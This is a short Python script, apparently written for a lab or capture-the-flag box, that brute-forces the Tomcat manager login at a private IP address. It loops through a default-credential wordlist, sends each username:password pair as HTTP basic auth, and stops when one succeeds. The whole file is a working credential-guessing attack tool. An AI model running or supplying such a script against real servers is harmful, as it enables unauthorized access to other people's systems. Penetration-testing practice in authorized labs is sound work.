#!/usr/bin/env python

import sys
import requests

with open('./pwd-lists/tomcat-betterdefaultpasslist.txt') as f:
    for line in f:
        c = line.strip('\n').split(":")
        r = requests.get('http://10.10.10.95:8080/manager/html', auth=(c[0], c[1]))

        if r.status_code == 200:
            print("Found valid credentials\"" + line.strip('\n') + "\"")
            raise sys.exit()
